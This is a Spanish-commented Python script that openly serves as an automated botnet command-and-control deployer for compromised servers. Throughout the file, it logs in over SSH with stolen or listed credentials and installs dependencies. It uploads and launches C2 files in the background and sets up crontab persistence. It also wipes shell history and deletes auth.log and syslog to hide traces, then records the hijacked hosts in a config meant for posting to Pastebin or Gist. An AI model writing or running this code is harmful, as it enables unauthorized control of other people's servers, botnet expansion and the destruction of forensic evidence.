#!/usr/bin/env python3
"""
Deploy Automático de C2 en Servidores Comprometidos
Instala y configura C2 Commander en servers hackeados
"""

import paramiko
import sys
import os
import json
import time
from datetime import datetime

class Colors:
    GREEN = '\033[92m'
    RED = '\033[91m'
    YELLOW = '\033[93m'
    CYAN = '\033[96m'
    BOLD = '\033[1m'
    RESET = '\033[0m'

class C2Deployer:
    def __init__(self):
        self.deployed_servers = []
    
    def print_banner(self):
        banner = f"""
{Colors.CYAN}╔═══════════════════════════════════════════════╗
║      🚀 AUTO-DEPLOY C2 EN COMPROMETIDOS 🚀    ║
╚═══════════════════════════════════════════════╝{Colors.RESET}
"""
        print(banner)
    
    def connect_ssh(self, host, port, username, password):
        """Conecta por SSH al servidor"""
        print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Conectando a {host}:{port}...")
        
        try:
            client = paramiko.SSHClient()
            client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
            client.connect(host, port=port, username=username, password=password, timeout=10)
            
            print(f"{Colors.GREEN}[✓]{Colors.RESET} Conectado exitosamente")
            return client
        
        except Exception as e:
            print(f"{Colors.RED}[✗]{Colors.RESET} Error de conexión: {e}")
            return None
    
    def check_system(self, client):
        """Verifica características del sistema"""
        print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Analizando sistema...")
        
        try:
            # Sistema operativo
            stdin, stdout, stderr = client.exec_command("uname -a")
            uname = stdout.read().decode().strip()
            
            # Python disponible
            stdin, stdout, stderr = client.exec_command("which python3")
            python_path = stdout.read().decode().strip()
            
            # Memoria
            stdin, stdout, stderr = client.exec_command("free -m | grep Mem | awk '{print $2}'")
            total_mem = stdout.read().decode().strip()
            
            # Espacio en disco
            stdin, stdout, stderr = client.exec_command("df -h / | tail -1 | awk '{print $4}'")
            disk_space = stdout.read().decode().strip()
            
            info = {
                'os': uname,
                'python': python_path if python_path else 'No disponible',
                'memory_mb': total_mem,
                'disk_space': disk_space
            }
            
            print(f"{Colors.CYAN}OS:{Colors.RESET} {info['os']}")
            print(f"{Colors.CYAN}Python:{Colors.RESET} {info['python']}")
            print(f"{Colors.CYAN}RAM:{Colors.RESET} {info['memory_mb']} MB")
            print(f"{Colors.CYAN}Disco:{Colors.RESET} {info['disk_space']}")
            
            return info
        
        except Exception as e:
            print(f"{Colors.RED}[✗]{Colors.RESET} Error analizando sistema: {e}")
            return None
    
    def install_dependencies(self, client):
        """Instala dependencias necesarias"""
        print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Instalando dependencias...")
        
        commands = [
            "apt-get update -qq",
            "apt-get install -y python3 python3-pip -qq",
            "pip3 install paramiko pysocks --quiet"
        ]
        
        try:
            for cmd in commands:
                print(f"{Colors.CYAN}  → {cmd}{Colors.RESET}")
                stdin, stdout, stderr = client.exec_command(cmd, get_pty=True)
                stdout.channel.recv_exit_status()  # Esperar a que termine
            
            print(f"{Colors.GREEN}[✓]{Colors.RESET} Dependencias instaladas")
            return True
        
        except Exception as e:
            print(f"{Colors.RED}[✗]{Colors.RESET} Error instalando dependencias: {e}")
            return False
    
    def upload_files(self, client, host):
        """Sube archivos del C2 al servidor"""
        print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Subiendo archivos C2...")
        
        files_to_upload = [
            'c2_commander.py',
            'banner.py',
            'shodan_hunter.py',
            'c2_servers.json',
            'cert.pem',
            'key.pem'
        ]
        
        try:
            sftp = client.open_sftp()
            
            # Crear directorio
            remote_dir = '/tmp/c2_botnet'
            try:
                sftp.mkdir(remote_dir)
            except:
                pass  # Ya existe
            
            # Subir archivos
            for filename in files_to_upload:
                if os.path.exists(filename):
                    local_path = filename
                    remote_path = f"{remote_dir}/{filename}"
                    
                    print(f"{Colors.CYAN}  → Subiendo {filename}...{Colors.RESET}")
                    sftp.put(local_path, remote_path)
                else:
                    print(f"{Colors.YELLOW}[!]{Colors.RESET} {filename} no encontrado, saltando...")
            
            sftp.close()
            print(f"{Colors.GREEN}[✓]{Colors.RESET} Archivos subidos a {remote_dir}")
            return remote_dir
        
        except Exception as e:
            print(f"{Colors.RED}[✗]{Colors.RESET} Error subiendo archivos: {e}")
            return None
    
    def start_c2(self, client, remote_dir):
        """Inicia el C2 Commander en background"""
        print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Iniciando C2 Commander...")
        
        try:
            # Comando para ejecutar en background
            cmd = f"cd {remote_dir} && nohup python3 c2_commander.py > c2.log 2>&1 &"
            
            stdin, stdout, stderr = client.exec_command(cmd)
            time.sleep(2)  # Esperar a que inicie
            
            # Verificar si está corriendo
            stdin, stdout, stderr = client.exec_command("ps aux | grep c2_commander | grep -v grep")
            process = stdout.read().decode().strip()
            
            if process:
                print(f"{Colors.GREEN}[✓]{Colors.RESET} C2 iniciado correctamente")
                print(f"{Colors.CYAN}Proceso:{Colors.RESET} {process[:80]}...")
                return True
            else:
                print(f"{Colors.RED}[✗]{Colors.RESET} C2 no se inició correctamente")
                return False
        
        except Exception as e:
            print(f"{Colors.RED}[✗]{Colors.RESET} Error iniciando C2: {e}")
            return False
    
    def add_persistence(self, client, remote_dir):
        """Agrega persistencia con cron"""
        print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Configurando persistencia...")
        
        try:
            # Agregar a crontab para reiniciar si se cae
            cron_line = f"@reboot cd {remote_dir} && python3 c2_commander.py > /dev/null 2>&1 &"
            
            cmd = f'(crontab -l 2>/dev/null; echo "{cron_line}") | crontab -'
            stdin, stdout, stderr = client.exec_command(cmd)
            
            print(f"{Colors.GREEN}[✓]{Colors.RESET} Persistencia configurada (crontab)")
            return True
        
        except Exception as e:
            print(f"{Colors.YELLOW}[!]{Colors.RESET} No se pudo configurar persistencia: {e}")
            return False
    
    def clean_logs(self, client):
        """Limpia logs y rastros"""
        print(f"\n{Colors.YELLOW}[*]{Colors.RESET} Limpiando rastros...")
        
        commands = [
            "history -c",
            "echo '' > ~/.bash_history",
            "rm -f /var/log/auth.log*",
            "rm -f /var/log/syslog*"
        ]
        
        try:
            for cmd in commands:
                client.exec_command(cmd)
            
            print(f"{Colors.GREEN}[✓]{Colors.RESET} Rastros limpiados")
            return True
        
        except:
            print(f"{Colors.YELLOW}[!]{Colors.RESET} No se pudieron limpiar todos los logs")
            return False
    
    def deploy(self, host, port, username, password):
        """Proceso completo de deploy"""
        print(f"\n{Colors.BOLD}{Colors.CYAN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}DEPLOYING EN: {host}:{port}{Colors.RESET}")
        print(f"{Colors.CYAN}{'='*60}{Colors.RESET}")
        
        # 1. Conectar
        client = self.connect_ssh(host, port, username, password)
        if not client:
            return False
        
        try:
            # 2. Verificar sistema
            info = self.check_system(client)
            if not info:
                return False
            
            # 3. Instalar dependencias
            if not self.install_dependencies(client):
                return False
            
            # 4. Subir archivos
            remote_dir = self.upload_files(client, host)
            if not remote_dir:
                return False
            
            # 5. Iniciar C2
            if not self.start_c2(client, remote_dir):
                return False
            
            # 6. Persistencia
            self.add_persistence(client, remote_dir)
            
            # 7. Limpiar rastros
            self.clean_logs(client)
            
            # Guardar info del servidor
            server_info = {
                'host': host,
                'port': port,
                'deployed_at': datetime.utcnow().isoformat() + 'Z',
                'system_info': info,
                'remote_dir': remote_dir
            }
            self.deployed_servers.append(server_info)
            
            print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
            print(f"{Colors.BOLD}{Colors.GREEN}✅ DEPLOY COMPLETADO EN {host}{Colors.RESET}")
            print(f"{Colors.GREEN}{'='*60}{Colors.RESET}\n")
            
            return True
        
        finally:
            client.close()
    
    def save_deployed_servers(self):
        """Guarda lista de servidores comprometidos"""
        try:
            # Cargar config existente
            with open('c2_servers.json', 'r') as f:
                config = json.load(f)
            
            # Agregar servidores comprometidos
            server_id = 2
            for server in self.deployed_servers:
                server_entry = {
                    'id': f'compromised_{server_id}',
                    'type': 'compromised',
                    'address': server['host'],
                    'port': server['port'],
                    'use_tor': False,
                    'priority': server_id + 1,
                    'status': 'active',
                    'description': f"Server comprometido - {server['system_info']['os'][:50]}"
                }
                config['c2_servers'].append(server_entry)
                server_id += 1
            
            # Actualizar timestamp
            config['last_updated'] = datetime.utcnow().isoformat() + 'Z'
            
            # Guardar
            with open('c2_servers.json', 'w') as f:
                json.dump(config, f, indent=2)
            
            print(f"\n{Colors.GREEN}[✓]{Colors.RESET} c2_servers.json actualizado con {len(self.deployed_servers)} servidores nuevos")
            
        except Exception as e:
            print(f"{Colors.RED}[✗]{Colors.RESET} Error actualizando config: {e}")

def main():
    deployer = C2Deployer()
    deployer.print_banner()
    
    print(f"{Colors.YELLOW}Este script desplegará C2 en servidores comprometidos.{Colors.RESET}\n")
    
    # Modo: manual o desde archivo
    print(f"{Colors.CYAN}[1]{Colors.RESET} Deploy manual (ingresar credenciales)")
    print(f"{Colors.CYAN}[2]{Colors.RESET} Deploy desde archivo targets.txt")
    print(f"{Colors.CYAN}[3]{Colors.RESET} Deploy desde últimos targets de Shodan\n")
    
    choice = input(f"{Colors.YELLOW}Selecciona opción:{Colors.RESET} ")
    
    if choice == '1':
        # Manual
        host = input(f"{Colors.CYAN}Host/IP:{Colors.RESET} ")
        port = int(input(f"{Colors.CYAN}Puerto SSH:{Colors.RESET} ") or "22")
        username = input(f"{Colors.CYAN}Usuario:{Colors.RESET} ")
        password = input(f"{Colors.CYAN}Contraseña:{Colors.RESET} ")
        
        deployer.deploy(host, port, username, password)
    
    elif choice == '2':
        # Desde archivo
        # Formato: host:port:user:pass (uno por línea)
        if not os.path.exists('targets.txt'):
            print(f"{Colors.RED}[✗]{Colors.RESET} targets.txt no encontrado")
            sys.exit(1)
        
        with open('targets.txt', 'r') as f:
            for line in f:
                line = line.strip()
                if not line or line.startswith('#'):
                    continue
                
                try:
                    parts = line.split(':')
                    host = parts[0]
                    port = int(parts[1]) if len(parts) > 1 else 22
                    username = parts[2] if len(parts) > 2 else 'root'
                    password = parts[3] if len(parts) > 3 else ''
                    
                    deployer.deploy(host, port, username, password)
                    time.sleep(2)  # Esperar entre deploys
                
                except Exception as e:
                    print(f"{Colors.RED}[✗]{Colors.RESET} Error procesando línea: {line} - {e}")
    
    elif choice == '3':
        print(f"{Colors.YELLOW}[*]{Colors.RESET} Buscando últimos targets de Shodan...")
        # TODO: Integrar con shodan_hunter.py para obtener targets
        print(f"{Colors.YELLOW}[!]{Colors.RESET} Función no implementada aún")
    
    # Guardar servidores deployed
    if deployer.deployed_servers:
        deployer.save_deployed_servers()
        
        print(f"\n{Colors.GREEN}{'='*60}{Colors.RESET}")
        print(f"{Colors.BOLD}{Colors.GREEN}✅ DEPLOY COMPLETO{Colors.RESET}")
        print(f"{Colors.GREEN}{'='*60}{Colors.RESET}")
        print(f"\n{Colors.CYAN}Servidores comprometidos activos:{Colors.RESET} {len(deployer.deployed_servers)}")
        print(f"\n{Colors.YELLOW}Siguiente paso:{Colors.RESET} Sube c2_servers.json actualizado a Pastebin/Gist")

if __name__ == "__main__":
    main()
